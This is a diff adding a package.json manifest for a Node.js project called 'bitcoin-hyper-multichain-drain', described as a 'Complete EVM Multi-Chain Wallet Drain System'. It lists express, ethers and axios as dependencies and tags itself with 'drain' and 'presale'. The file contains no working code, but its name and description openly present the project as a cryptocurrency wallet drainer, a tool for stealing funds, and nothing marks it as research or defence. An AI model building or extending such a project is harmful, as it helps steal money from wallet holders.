@@ -1,0 +1,41 @@
+
+{
+  "name": "bitcoin-hyper-multichain-drain",
+  "version": "14.0.0",
+  "description": "Complete EVM Multi-Chain Wallet Drain System",
+  "main": "index.js",
+  "type": "commonjs",
+  "scripts": {
+    "start": "node index.js",
+    "dev": "nodemon index.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "cors": "^2.8.5",
+    "helmet": "^7.0.0",
+    "morgan": "^1.10.0",
+    "axios": "^1.6.0",
+    "crypto": "^1.0.1",
+    "express-rate-limit": "^7.1.5",
+    "ethers": "^6.8.0",
+    "dotenv": "^16.3.1"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.1"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "keywords": [
+    "bitcoin",
+    "hyper",
+    "multichain",
+    "drain",
+    "evm",
+    "crypto",
+    "presale"
+  ],
+  "author": "Bitcoin Hyper Team",
+  "license": "PROPRIETARY"
+}
